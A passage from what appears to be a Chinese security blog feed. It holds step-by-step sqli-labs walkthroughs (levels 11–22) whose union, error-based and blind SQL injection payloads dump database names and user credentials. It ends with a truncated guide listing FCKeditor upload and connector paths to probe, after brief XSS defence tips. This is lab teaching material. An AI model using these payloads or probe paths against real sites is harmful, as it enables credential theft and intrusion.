class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">&lt;iframe&gt;</span><br><span class="line">&lt;noframes&gt;</span><br><span class="line">&lt;noscript&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">&lt;textarea&gt;</span><br><span class="line">&lt;title&gt;</span><br><span class="line">&lt;xmp&gt;</span><br></pre></td></tr></table></figure><h1 id="防御方式"><a href="#防御方式" class="headerlink" title="防御方式"></a>防御方式</h1></li><li>对用户的输入进行合理验证，对特殊字符（如&lt;、&gt;、’、”等）以及 <code>&lt;script&gt;</code>、 <code>javascript</code> 等进行过滤。</li><li>采用 OWASP ESAPI 对数据输出 HTML 上下文中不同位置（HTML 标签、HTML属性、JavaScript 脚本、CSS、URL）进行恰当的输出编码。</li><li>设置 HttpOnly 属性，避免攻击者利用跨站脚本漏洞进行 Cookie 劫持攻击。在 Java EE中，给 Cookie 添加 HttpOnly 的代码如下：<br>  java:  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cookie.setHttpOnly(true);</span><br></pre></td></tr></table></figure>  python:  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tools.sessions.httponly = True</span><br></pre></td></tr></table></figure>  php:  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">session.cookie_httponly =1</span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqli-labs靶场18-22</title>
      <link href="/archives/ab52f8fd.html"/>
      <url>/archives/ab52f8fd.html</url>
      
        <content type="html"><![CDATA[<p>参考crow: <a href="https://github.com/crow821/crowsec">https://github.com/crow821/crowsec</a></p><h1 id="less-18"><a href="#less-18" class="headerlink" title="less - 18"></a>less - 18</h1><ul><li>http头注入</li><li>浏览器插件<code>ModHeader</code></li><li>通过修改<code>User-Agent: </code>的值进行注入</li><li>原 : <code>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0</code></li><li>注入语句 : <code>User-Agent: &#39; or updatexml(1,concat(0x7e,(database())),1) and &#39;1&#39;=&#39;1</code>       (报错注入)</li><li>后续通过更改构造语句获得其他的信息<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; or updatexml(1,concat(0x7e,构造语句)),1) and &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">构造语句:</span><br><span class="line">查库： select schema_name from information_schema.schemata;</span><br><span class="line">查表： select table_name from information_schema.tables where table_schema=&#x27;security&#x27;;</span><br><span class="line">查列： select column_name from information_schema.columns where table_name=&#x27;users&#x27;;</span><br><span class="line">查字段：select username,password from security.users;</span><br></pre></td></tr></table></figure><h1 id="less-19"><a href="#less-19" class="headerlink" title="less - 19"></a>less - 19</h1></li><li>http头注入</li><li>浏览器插件<code>ModHeader</code></li><li>通过修改<code>Referer: </code>的值进行注入</li><li>原: <code>Referer: http://192.168.169.149:86/Less-19/</code></li><li>注入语句: <code>&#39; or updatexml(1,concat(0x7e,(database())),1) and &#39;1&#39;=&#39;1</code></li><li>后续通过更改构造语句获得其他的信息<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; or updatexml(1,concat(0x7e,构造语句)),1) and &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">构造语句:</span><br><span class="line">查库： select schema_name from information_schema.schemata;</span><br><span class="line">查表： select table_name from information_schema.tables where table_schema=&#x27;security&#x27;;</span><br><span class="line">查列： select column_name from information_schema.columns where table_name=&#x27;users&#x27;;</span><br><span class="line">查字段： select username,password from security.users;</span><br></pre></td></tr></table></figure></li></ul><h1 id="less-20"><a href="#less-20" class="headerlink" title="less - 20"></a>less - 20</h1><ul><li>cookie注入</li><li>浏览器插件<code>Cookie-Editor</code></li><li>在插件里面修改<code>Value</code>的内容,记得点击左边的保存.<br> admin —&gt; admin’</li><li>剩下的语句和其他的注入语句一样<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select 1,2,group_concat(concat_ws(0x7e,username,password)) from security.users #</span><br></pre></td></tr></table></figure></li></ul><h1 id="less-21"><a href="#less-21" class="headerlink" title="less - 21"></a>less - 21</h1><ul><li>cookie注入</li><li>浏览器插件<code>Cookie-Editor</code></li><li>在插件里面修改<code>Value</code>的内容,这一关的值是<code>Base64</code>加密过的通过解码可知晓,记得点击左边的保存.<br> YWRtaW4%3D 通过解码后—&gt; admin   </li><li>剩下的语句和其他的注入语句一样<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;) union select 1,2,group_concat(concat_ws(0x7e,username,password)) from security.users #</span><br></pre></td></tr></table></figure></li><li>写入<code>Value</code>的内容再通过<code>Base64</code>编码后即可使用.</li></ul><h1 id="less-22"><a href="#less-22" class="headerlink" title="less - 22"></a>less - 22</h1><ul><li>和第21关相似，只不过这一次将’) 换为” 即可！</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqli-labs靶场11-17</title>
      <link href="/archives/9fa8bfd5.html"/>
      <url>/archives/9fa8bfd5.html</url>
      
        <content type="html"><![CDATA[<p>参考crow: <a href="https://github.com/crow821/crowsec">https://github.com/crow821/crowsec</a></p><h1 id="Less-11"><a href="#Less-11" class="headerlink" title="Less-11"></a>Less-11</h1><ol><li><p>POST内容： uname&#x3D;’ &amp; passwd&#x3D;1&amp;submit&#x3D;Submit 返回的结果显示你存在sql语法错误，证明存在注入漏洞。或这是直接在username中填写’，password中随便写判断一下是否存在注入漏洞。</p></li><li><p>直接在username中填写 admin’ or 1&#x3D;1#（此处不能使用–+，因为–+主要使用在url中，#是适用的）即： </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=a&#x27; or 1=1 #&amp; passwd=a &amp;submit=Submit</span><br></pre></td></tr></table></figure><p>此时登录成功，可以验证存在注入漏洞。</p></li><li><p>此时在password位置进行验证：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=a&amp;passwd=a&#x27; or 1=1# &amp;submit=Submit</span><br></pre></td></tr></table></figure><p>登录成功，开始构造！  </p></li><li><p>同样可以进行判断，最后得出一共有两列。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=a&#x27; order by 3#&amp;passwd=a &amp;submit=Submit</span><br></pre></td></tr></table></figure><p>或者是使用 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=a&amp;passwd=a&#x27; order by 2# &amp;submit=Submit</span><br></pre></td></tr></table></figure></li><li><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=a&amp;passwd=a&#x27; union select database(),2  # &amp;submit=Submit</span><br></pre></td></tr></table></figure><p>查询到当前的数据库为security，或者是使用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=a&#x27; union select database(),2  # &amp;passwd=a&amp;submit=Submit</span><br></pre></td></tr></table></figure><p>均可以查询到当前的数据库，当然也可以查询其它信息。</p></li><li><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=a&#x27; union select 1,(select schema_name from information_schema.schemata limit 1,1)  # &amp;passwd=a&amp;submit=Submit </span><br></pre></td></tr></table></figure><p>可以查询到当前的第一个数据库，或者是使用命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=a&#x27; union select 1,(select group_concat(schema_name) from information_schema.schemata)  # &amp;passwd=a&amp;submit=Submit </span><br></pre></td></tr></table></figure><p>可以得到所有的数据库。</p></li><li><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=a&#x27; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=0x7365637572697479)  # &amp;passwd=a&amp;submit=Submit </span><br></pre></td></tr></table></figure><p>可以得到security数据库中的所有的表信息</p></li><li><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=a&#x27; union select 1,(select group_concat(column_name) from information_schema.columns where table_name=0x7573657273)  # &amp;passwd=a&amp;submit=Submit </span><br></pre></td></tr></table></figure><p>通过users表获得里面的列值：id,username,password</p></li><li><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=a&#x27; union select 1, group_concat(concat_ws(&#x27;~&#x27;,username,password)) from security.users  # &amp;passwd=a&amp;submit=Submit</span><br></pre></td></tr></table></figure><p>此时就可以得到里面所有的数据。</p></li></ol><h1 id="Less-12"><a href="#Less-12" class="headerlink" title="Less-12"></a>Less-12</h1><p>以下均为POST内容：</p><ol><li><p>首先进行尝试：此时只是显示登陆失败，没有其他的回显，将’换为”</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&#x27; &amp;passwd=a&amp;submit=Submit  </span><br></pre></td></tr></table></figure></li><li><p>此时有回显，显示有报错信息，通过报错信息，我们知道如何进行构造：’)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&quot; &amp;passwd=a&amp;submit=Submit</span><br></pre></td></tr></table></figure></li><li><p>此时构造成功之后，显示登陆成功。接下来的和less-11相同。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&quot;) or 1=1# &amp;passwd=a&amp;submit=Submit</span><br></pre></td></tr></table></figure></li><li><p>通过order by语句得到一共有两列。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&quot;) order by 3# &amp;passwd=a&amp;submit=Submit </span><br></pre></td></tr></table></figure></li><li><p>查询到当前的数据库为security</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=a&amp;passwd=a&quot;) union select database(),2  # &amp;submit=Submit</span><br></pre></td></tr></table></figure><p>或者是使用： </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=a&quot;) union select database(),2  # &amp;passwd=a&amp;submit=Submit</span><br></pre></td></tr></table></figure><p>均可以查询到当前的数据库，当然也可以查询其它信息。</p></li><li><p>可以查询到当前的第一个数据库，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=a&quot;) union select 1,(select schema_name from information_schema.schemata limit 1,1)  # &amp;passwd=a&amp;submit=Submit</span><br></pre></td></tr></table></figure><p>或者是使用命令： </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=a&quot;) union select 1,(select group_concat(schema_name) from information_schema.schemata)  # &amp;passwd=a&amp;submit=Submit</span><br></pre></td></tr></table></figure><p>  可以得到所有的数据库。</p></li><li><p>可以得到security数据库中的所有的表信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=a&quot;) union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=0x7365637572697479)  # &amp;passwd=a&amp;submit=Submit</span><br></pre></td></tr></table></figure></li><li><p>通过users表获得里面的列值：id,username,password</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=a&quot;) union select 1,(select group_concat(column_name) from information_schema.columns where table_name=0x7573657273)  # &amp;passwd=a&amp;submit=Submit</span><br></pre></td></tr></table></figure></li><li><p>此时就可以得到里面所有的数据。 0x7e代表的就是  ~</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=a&quot;) union select 1, group_concat(concat_ws(0x7e,username,password)) from security.users  # &amp;passwd=a&amp;submit=Submit </span><br></pre></td></tr></table></figure><h1 id="Less-13"><a href="#Less-13" class="headerlink" title="Less-13"></a>Less-13</h1><p>以下均为POST内容：</p></li><li><p>此时只是显示登陆成功，但是不会显示其他的信息。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin &amp;passwd=admin&amp;submit=Submit  </span><br></pre></td></tr></table></figure></li><li><p>直接通过报错信息知道了如何构造   构造：1’) or 1&#x3D;1#</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=&#x27; &amp;passwd=a&amp;submit=Submit  </span><br></pre></td></tr></table></figure></li><li><p>此时只是显示登陆成功，但是不会显示其他信息，考虑盲注。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&#x27;) order by 2# &amp;passwd=admin&amp;submit=Submit  </span><br></pre></td></tr></table></figure></li><li><p>此时可以得到数据库的长度是8.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&#x27;) or if(length(database())=8,1,sleep(5))# &amp;passwd=admin&amp;submit=Submit </span><br></pre></td></tr></table></figure></li><li><p>使用or和left()来判断第一个字母是多少(注意的是这里不是使用and)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&amp;passwd=ain&#x27;) or left(database(),1)&gt;&#x27;a&#x27;#&amp;submit=Submit </span><br></pre></td></tr></table></figure></li><li><p>通过这样一个个进行判断即可！</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&amp;passwd=ain&#x27;) or left(database(),2)=&#x27;se&#x27;#&amp;submit=Submit </span><br></pre></td></tr></table></figure></li><li><p>或者是使用这种方法也是可以判断的。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&amp;passwd=ain&#x27;) or left((select schema_name from information_schema.schemata limit 0,1),1)&gt;&#x27;a&#x27;#&amp;submit=Submit </span><br></pre></td></tr></table></figure><p>查表，也可使用burpsuite进行辅助测试</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&amp;passwd=ain&#x27;) or left((select table_name from information_schema.tables where table_schema=0x7365637572697479 limit 0,1),1)=&#x27;e&#x27;#&amp;submit=Submit  </span><br></pre></td></tr></table></figure><h1 id="Less-14"><a href="#Less-14" class="headerlink" title="Less-14"></a>Less-14</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. uname=admin&amp;passwd=a&quot;&amp;submit=Submit   构造：&quot; or 1=1#</span><br><span class="line">2. uname=admin&amp;passwd=a&quot; order by 10#sub&amp;mit=Submit 判断一共有多少列</span><br><span class="line">3. uname=admin&amp;passwd=a&quot; or if(length(database())=8,1,sleep(5))# #&amp;submit=Submit 使用和less-13同样的方法进行判断 </span><br><span class="line">* 注意and和or的用法</span><br></pre></td></tr></table></figure><h1 id="Less-15"><a href="#Less-15" class="headerlink" title="Less-15"></a>Less-15</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1. uname=admin&amp;passwd=a&quot;&amp;submit=Submit    构造：1&#x27; or 1=1#   在这里判断列数没有实际意义了</span><br><span class="line">2. uname=adminadmin&amp;passwd=admiand&#x27; or if(length(database())&gt;1000,1,sleep(5))#&amp;submit=Submit通过这个来判断其长度</span><br><span class="line">3. uname=adminadmin&amp;passwd=admiand&#x27; or if(length()&gt;1000,1,sleep(5))#&amp;submit=Submit</span><br><span class="line">4. uname=adminadmin&amp;passwd=admiand&#x27; or left((select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 0,1),1)&gt;&#x27;a&#x27;#&amp;submit=Submit 使用和less-13相同的方法进行判断，就可以判断出当前security库的第一个表的第一个字母是否大于a</span><br><span class="line">5. uname=adminadmin&amp;passwd=admiand&#x27; or left((select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 0,1),1)&gt;&#x27;g&#x27;#&amp;submit=Submit 通过同样的方法可以判断users表中的字段数据是否大于g</span><br><span class="line">6. uname=adminadmin&amp;passwd=admiand&#x27; or left((select username from security.users limit 0,1),1)&gt; &#x27;a&#x27;#&amp;submit=Submit通过这个来判断security.users下的username下第一个字段的第一位，在这里不能直接使用select username,password来一起查询，需要一个个进行查询</span><br></pre></td></tr></table></figure><h1 id="Less-16"><a href="#Less-16" class="headerlink" title="Less-16"></a>Less-16</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1. uname = admin&amp;passwd=a&quot; &amp; submit=Submit    构造：1&quot;)  or 1=1#   在这里判断列数没有实际意义了,和less-15相同</span><br><span class="line">2. uname = adminadmin&amp;passwd=admiand&quot;) or if(length(database())&gt;1,1,sleep(5))#&amp;submit=Submit通过这个来判断其长度</span><br><span class="line">3. uname=adminadmin&amp;passwd=admiand&quot;) or if(length()&gt;1000,1,sleep(5))#&amp;submit=Submit</span><br><span class="line">4. uname=adminadmin&amp;passwd=admiand&quot;) or left((select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 0,1),1)&gt;&#x27;a&#x27;#&amp;submit=Submit 使用和less-13相同的方法进行判断，就可以判断出当前security库的第一个表的第一个字母是否大于a</span><br><span class="line">5. uname=adminadmin&amp;passwd=admiand&quot;) or left((select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 0,1),1)&gt;&#x27;g&#x27;#&amp;submit=Submit 通过同样的方法可以判断users表中的字段数据是否大于g</span><br><span class="line">6. uname=adminadmin&amp;passwd=admiand&quot;) or left((select username from security.users limit 0,1),1)&gt; &#x27;a&#x27;#&amp;submit=Submit通过这个来判断security.users下的username下第一个字段的第一位，在这里不能直接使用select username,password来一起查询，需要一个个进行查询</span><br></pre></td></tr></table></figure><h1 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h1></li></ol><ul><li>报错注入常用的三种注入方式(flool ,extractvalue、updatexml)</li><li>floor()报错注入是利用count()、rand()、floor()、group by 这几个特定的函数结合在一起产生的注入漏洞，准确的说是floor,count,group by冲突报错。</li><li>原理：updatexml()函数实际上是去更新了XML文档，但是我们在xml文档路径的位置里面写入了子查询，我们输入特殊字符，然后就因为不符合输入规则然后报错了，但是报错的时候它其实已经执行了那个子查询代码。</li><li>extractvalue(xml_document,xpath_string)<br>第一个参数:XML_document是 String 格式，为XMIL文档对象的名称。<br>第二个参数:XPath_string (Xpath格式的字符串)。<br>作用: 从目标XML中返回包含所查询值的字符串。<br>ps: 返回结果限制在32位字符。</li></ul><p>报错原理：利用数据库表主键不能重复的原理，使用GROUP BY分组，产生主键冗余，导致报错。<br>UPDATEXML (XML_document, XPath_string, new_value);<br>第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc<br>第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。<br>第三个参数：new_value，String格式，替换查找到的符合条件的数据<br>作用：改变文档中符合条件的节点的值<br>改变XML_document中符合XPATH_string的值<br>而我们的注入语句为：<br>select updatexml(1,concat(0x7e,(SELECT username from security.users limit 0,1),0x7e),1);<br>其中的concat()函数是将其连成一个字符串，因此不会符合XPATH_string的格式，从而出现格式错误，爆出<br>ERROR 1105 (HY000): XPATH syntax error: ‘<del>Dumb</del>‘</p><h1 id="Less-17"><a href="#Less-17" class="headerlink" title="Less-17"></a>Less-17</h1><p>首先我们要知道用户的名字是多少，然后才可以进行接下来的操作</p><ol><li>通过查询，可以得到security库下面的其中一个表名字<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&amp;passwd=adm &#x27; and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 0,1),0x7e),1)#&amp;submit=Submit  </span><br></pre></td></tr></table></figure></li><li>同样的方法可以获得其他的数据<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&amp;passwd=adm &#x27; and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 0,1),0x7e),1)#&amp;submit=Submit </span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&amp;passwd=afafa&#x27;#&amp;submit=Submit</span><br><span class="line">select updatexml(1,concat(0x7e,(database())),1);</span><br><span class="line">select updatexml(1,concat(0x7e,(构造语句)),1);</span><br><span class="line">      构造语句:</span><br><span class="line">      查库： select schema_name from information_schema.schemata;</span><br><span class="line">      查表： select table_name from information_schema.tables where table_schema=&#x27;security&#x27;;</span><br><span class="line">      查列： select column_name from information_schema.columns where table_name=&#x27;users&#x27;;</span><br><span class="line">      查字段： select username,password from security.users;</span><br><span class="line">and updatexml(1,concat(0x7e,(select schema_name from information_schema.schemata limit 0,1)),1)</span><br><span class="line">and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=&#x27;security&#x27;)),1)</span><br></pre></td></tr></table></figure>select * from (select group_concat(concat_ws(‘~’,username,password)) from security.users) a</li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文本编辑器漏洞</title>
      <link href="/archives/4847d6c1.html"/>
      <url>/archives/4847d6c1.html</url>
      
        <content type="html"><![CDATA[<ul><li>常见的文本编辑器有CKEditor、.Ewebeditor、UEditor、KindEditor、XHeditor等。这类编辑器的功能是非常类似的，比如都有图片上传、视频上传、远程下载等功能，这类文本编辑器也称为富文本编辑器</li><li>使用此类编辑器减少了程序开发的时间，但是却增加了许多安全隐患，比如：使用CKEditor编辑器有10万个树站，如果CKEditor爆出一个GetShell漏洞，那么这10万个网站都因此受到牵连。<br>下面以FCKeditor编辑器为例，讲述文本编辑器漏洞。<h1 id="FCK编辑器漏洞"><a href="#FCK编辑器漏洞" class="headerlink" title="FCK编辑器漏洞"></a>FCK编辑器漏洞</h1>FCKeditor是一个开放源代码、所见即所得的文字编辑器，可以适用于ASP&#x2F;PHP&#x2F;ASPX&#x2F;JSP等脚本类型网站.</li><li>注：FCKeditor现已改名为CKEditor。<h2 id="FCKeditor编辑器页-x2F-查看编辑器版本-x2F-查看文件上传路径"><a href="#FCKeditor编辑器页-x2F-查看编辑器版本-x2F-查看文件上传路径" class="headerlink" title="FCKeditor编辑器页&#x2F;查看编辑器版本&#x2F;查看文件上传路径"></a>FCKeditor编辑器页&#x2F;查看编辑器版本&#x2F;查看文件上传路径</h2><h2 id="FCKeditor编辑器页"><a href="#FCKeditor编辑器页" class="headerlink" title="FCKeditor编辑器页"></a>FCKeditor编辑器页</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FCKeditor/_samples/default.html </span><br></pre></td></tr></table></figure><h2 id="查看编辑器版本"><a href="#查看编辑器版本" class="headerlink" title="查看编辑器版本"></a>查看编辑器版本</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FCKeditor/_whatsnew.html </span><br></pre></td></tr></table></figure><h2 id="查看文件上传路径"><a href="#查看文件上传路径" class="headerlink" title="查看文件上传路径"></a>查看文件上传路径</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fckeditor/editor/filemanager/browser/default/connectors/asp/connector.asp?Command=GetFoldersAndFiles&amp;Type=Image&amp;CurrentFolder=/ </span><br></pre></td></tr></table></figure><h2 id="查找可利用的上传页面"><a href="#查找可利用的上传页面" class="headerlink" title="查找可利用的上传页面"></a>查找可利用的上传页面</h2></li></ul><p>查找方法：</p><ol><li>手工收集上传地址，访问测试看是否能上传</li><li>利用编辑器对应利用工具查找上传页面</li><li>利用目录扫描工具进行探测查找<h3 id="常见上传页面地址"><a href="#常见上传页面地址" class="headerlink" title="常见上传页面地址"></a>常见上传页面地址</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">FCKeditor/editor/filemanager/browser/default/connectors/test.html</span><br><span class="line">FCKeditor/editor/filemanager/upload/test.html</span><br><span class="line">FCKeditor/editor/filemanager/connectors/test.html</span><br><span class="line">FCKeditor/editor/filemanager/connectors/uploadtest.html</span><br><span class="line">FCKeditor/_samples/default.html</span><br><span class="line">FCKeditor/_samples/default.html</span><br><span class="line">FCKeditor/_samples/asp/sample01.asp</span><br><span class="line">FCKeditor/_samples/asp/sample02.asp</span><br><span class="line">FCKeditor/_samples/asp/sample03.asp</span><br><span class="line">FCKeditor/_samples/asp/sample04.asp</span><br><span class="line">fckeditor/editor/filemanager/connectors/test.html</span><br></pre></td></tr></table></figure><h3 id="asp常用上传页面地址"><a href="#asp常用上传页面地址" class="headerlink" title="asp常用上传页面地址"></a>asp常用上传页面地址</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fckeditor//editor/filemanager/browser/default/connectors/asp/connector.asp?Command=GetFoldersAndFiles&amp;Type=Image&amp;CurrentFolder=/</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fckeditor//editor/filemanager/browser/default/browser.html?type=Image&amp;connector=connectors/asp/connector.asp</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fckeditor//editor/filemanager/browser/default/browser.html?Type=Image&amp;Connector=../../connectors/asp/connector.asp</span><br></pre></td></tr></table></figure><h3 id="aspx常用上传地址"><a href="#aspx常用上传地址" class="headerlink" title="aspx常用上传地址"></a>aspx常用上传地址</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fckeditor//editor/filemanager/browser/default/connectors/aspx/connector.aspx?Command=GetFoldersAndFiles&amp;Type=Image&amp;CurrentFolder=/</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fckeditor//editor/filemanager/browser/default/browser.html?type=Image&amp;connector=connectors/aspx/connector.aspx</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fckeditor//editor/filemanager/browser/default/browser.html?Type=Image&amp;Connector=../../connectors/aspx/connector.aspx</span><br></pre></td></tr></table></figure></li></ol><h3 id="php常用上传地址"><a href="#php常用上传地址" class="headerlink" title="php常用上传地址"></a>php常用上传地址</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 